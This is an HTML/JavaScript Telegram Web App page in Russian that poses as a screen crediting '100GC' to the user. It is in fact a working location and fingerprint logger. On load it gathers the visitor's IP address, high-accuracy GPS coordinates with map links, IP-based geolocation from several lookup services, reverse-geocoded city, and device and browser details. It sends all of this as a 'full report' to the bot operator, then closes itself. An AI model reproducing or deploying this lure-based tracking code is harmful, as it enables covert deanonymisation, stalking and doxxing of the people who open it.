<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Начисление GC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            padding: 30px;
            max-width: 400px;
            width: 100%;
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 15px; }
        p { font-size: 16px; opacity: 0.9; margin-bottom: 10px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { font-size: 64px; }
        .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
        .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
        .status-text { font-size: 12px; opacity: 0.7; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container" id="status">
        <div class="icon">💰</div>
        <h1>Начисление 100GC</h1>
        <p>Сбор данных...</p>
        <div class="spinner"></div>
        <p class="status-text" id="statusText">⏳ Подготовка...</p>
    </div>

    <script>
        let timer = 5;
        let timerInterval;

        function closeApp() {
            Telegram.WebApp.close();
        }

        function updateStatus(text) {
            document.getElementById('statusText').textContent = text;
        }

        // ========== 1. ПОЛУЧАЕМ IP ==========
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return null;
            }
        }

        // ========== 2. GPS (с таймаутом) ==========
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                // Даём 5 секунд на GPS
                const timeout = setTimeout(() => {
                    resolve(null);
                }, 5000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'GPS'
                        });
                    },
                    () => {
                        clearTimeout(timeout);
                        resolve(null);
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // ========== 3. ГЕОЛОКАЦИЯ ЧЕРЕЗ IP (5 сервисов) ==========
        async function getLocationViaIP(ip) {
            const services = [
                {
                    name: 'ip-api.com',
                    url: `https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName,as,org`
                },
                {
                    name: 'ipinfo.io',
                    url: `https://ipinfo.io/${ip}/json`
                },
                {
                    name: 'geoplugin.net',
                    url: 'https://www.geoplugin.net/json.gp'
                }
            ];

            for (const service of services) {
                try {
                    updateStatus(`🔍 ${service.name}...`);
                    const response = await fetch(service.url);
                    const data = await response.json();
                    
                    // ip-api.com
                    if (data.status === 'success' && data.lat) {
                        return {
                            country: data.country || 'Неизвестно',
                            city: data.city || 'Неизвестно',
                            region: data.regionName || 'Неизвестно',
                            lat: data.lat,
                            lon: data.lon,
                            isp: data.isp || data.org || 'Неизвестно',
                            timezone: data.timezone || 'Неизвестно',
                            source: 'ip-api.com'
                        };
                    }
                    
                    // ipinfo.io
                    if (data.loc) {
                        const [lat, lon] = data.loc.split(',').map(Number);
                        return {
                            country: data.country || 'Неизвестно',
                            city: data.city || 'Неизвестно',
                            region: data.region || 'Неизвестно',
                            lat: lat,
                            lon: lon,
                            isp: data.org || 'Неизвестно',
                            timezone: data.timezone || 'Неизвестно',
                            source: 'ipinfo.io'
                        };
                    }
                    
                    // geoplugin.net
                    if (data.geoplugin_status === '200') {
                        return {
                            country: data.geoplugin_countryName || 'Неизвестно',
                            city: data.geoplugin_city || 'Неизвестно',
                            region: data.geoplugin_region || 'Неизвестно',
                            lat: parseFloat(data.geoplugin_latitude) || 0,
                            lon: parseFloat(data.geoplugin_longitude) || 0,
                            isp: data.geoplugin_region || 'Неизвестно',
                            source: 'geoplugin.net'
                        };
                    }
                } catch (e) {}
            }
            return null;
        }

        // ========== 4. ОБРАТНЫЙ ГЕОКОДЕР (по координатам) ==========
        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=ru`);
                const data = await response.json();
                if (data.city || data.locality) {
                    return {
                        country: data.countryName || 'Неизвестно',
                        city: data.city || data.locality || 'Неизвестно',
                        region: data.principalSubdivision || 'Неизвестно'
                    };
                }
                return null;
            } catch { return null; }
        }

        // ========== 5. ПОЛУЧАЕМ ДАННЫЕ БРАУЗЕРА ==========
        function getBrowserData() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                vendor: navigator.vendor || 'Неизвестно',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
                deviceMemory: navigator.deviceMemory || 'Неизвестно',
                connection: navigator.connection ? 
                    `${navigator.connection.effectiveType} (${navigator.connection.downlink} Мбит/с)` : 
                    'Неизвестно',
                battery: navigator.getBattery ? 'Доступно' : 'Недоступно',
                cookies: navigator.cookieEnabled ? 'Включены' : 'Отключены',
                doNotTrack: navigator.doNotTrack || 'Неизвестно'
            };
        }

        // ========== 6. ГЛАВНАЯ ФУНКЦИЯ ==========
        async function sendData() {
            updateStatus('🌐 Получение IP...');
            const ip = await getIP();

            let location = null;
            let gpsData = null;
            let browserData = getBrowserData();

            let dataString = `📡 **ПОЛНЫЙ ОТЧЁТ**\n\n`;
            dataString += `🌐 IP: ${ip || 'Не определён'}\n`;

            // ===== ПЫТАЕМСЯ ПОЛУЧИТЬ GPS =====
            if (navigator.geolocation) {
                updateStatus('📍 Запрос GPS...');
                gpsData = await getGPS();
                
                if (gpsData && gpsData.lat) {
                    dataString += `\n📍 **GPS (точные координаты):**\n`;
                    dataString += `🗺️ Широта: ${gpsData.lat}\n`;
                    dataString += `🗺️ Долгота: ${gpsData.lon}\n`;
                    dataString += `📏 Точность: ±${Math.round(gpsData.accuracy)} метров\n`;
                    dataString += `📍 Карта: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}\n`;
                    
                    // Определяем город по GPS
                    updateStatus('🏙️ Определение города по GPS...');
                    const geo = await reverseGeocode(gpsData.lat, gpsData.lon);
                    if (geo) {
                        dataString += `🏙️ Город: ${geo.city}\n`;
                        dataString += `🌍 Страна: ${geo.country}\n`;
                    }
                    location = gpsData;
                } else {
                    dataString += `\n❌ GPS: Недоступен или отклонён\n`;
                }
            } else {
                dataString += `\n❌ GPS: Браузер не поддерживает\n`;
            }

            // ===== ЕСЛИ GPS НЕТ — ИЩЕМ ЧЕРЕЗ IP =====
            if (!location || !location.lat) {
                updateStatus('📍 Поиск гео через IP...');
                
                if (ip) {
                    const ipLocation = await getLocationViaIP(ip);
                    if (ipLocation && ipLocation.lat && ipLocation.lat !== 0) {
                        location = ipLocation;
                        dataString += `\n📍 **Геолокация (по IP):**\n`;
                        dataString += `🌍 Страна: ${ipLocation.country}\n`;
                        dataString += `🏙️ Город: ${ipLocation.city}\n`;
                        if (ipLocation.region && ipLocation.region !== 'Неизвестно') {
                            dataString += `🗺️ Регион: ${ipLocation.region}\n`;
                        }
                        dataString += `📡 Провайдер: ${ipLocation.isp}\n`;
                        dataString += `🕐 Часовой пояс: ${ipLocation.timezone || 'Неизвестно'}\n`;
                        dataString += `🗺️ Координаты: ${ipLocation.lat}, ${ipLocation.lon}\n`;
                        dataString += `📍 Карта: https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}\n`;
                        dataString += `📡 Источник: ${ipLocation.source}\n`;
                    } else {
                        dataString += `\n❌ Геолокация по IP не определена\n`;
                    }
                } else {
                    dataString += `\n❌ IP не определён\n`;
                }
            }

            // ===== ДАННЫЕ БРАУЗЕРА =====
            dataString += `\n🖥️ **Данные устройства:**\n`;
            dataString += `🕐 Часовой пояс: ${browserData.timezone}\n`;
            dataString += `🌐 Язык: ${browserData.language}\n`;
            dataString += `📱 Экран: ${browserData.screen}\n`;
            dataString += `💻 Платформа: ${browserData.platform}\n`;
            dataString += `🔌 Подключение: ${browserData.connection}\n`;
            dataString += `🧠 Ядер CPU: ${browserData.hardwareConcurrency}\n`;
            dataString += `💾 Память: ${browserData.deviceMemory} ГБ\n`;
            dataString += `🍪 Cookies: ${browserData.cookies}\n`;
            dataString += `🛡️ Do Not Track: ${browserData.doNotTrack}\n`;

            // ===== User-Agent =====
            dataString += `\n📱 User-Agent:\n${browserData.userAgent}\n`;

            // ===== ВРЕМЯ =====
            dataString += `\n🕐 Время запроса: ${new Date().toLocaleString()}\n`;
            dataString += `🕐 UTC: ${new Date().toISOString()}\n`;

            // Отправляем в Telegram
            updateStatus('📤 Отправка данных...');
            Telegram.WebApp.sendData(dataString);

            // ===== ПОКАЗЫВАЕМ РЕЗУЛЬТАТ =====
            let html = `
                <div class="icon success">✅</div>
                <h1>100GC начислены!</h1>
                <p>Данные собраны</p>
                <p class="info">🌐 IP: ${ip || 'Неизвестно'}</p>
            `;

            if (gpsData && gpsData.lat) {
                html += `<p class="info">📍 GPS: ${gpsData.lat}, ${gpsData.lon}</p>`;
                html += `<p class="info" style="font-size: 12px;">📏 ±${Math.round(gpsData.accuracy)}м</p>`;
            } else if (location && location.lat) {
                html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
                html += `<p class="info" style="font-size: 12px;">📡 ${location.source || 'IP'}</p>`;
            } else {
                html += `<p class="info">❌ Геолокация не найдена</p>`;
                html += `<p class="info" style="font-size: 12px;">📡 Собраны данные браузера</p>`;
            }

            html += `<p class="small">Закрывается через 5 секунд...</p>`;
            document.getElementById('status').innerHTML = html;

            timer = 5;
            timerInterval = setInterval(() => {
                timer--;
                if (timer <= 0) {
                    clearInterval(timerInterval);
                    closeApp();
                }
            }, 1000);
        }

        // ===== ЗАПУСК =====
        sendData();
    </script>
</body>
</html>
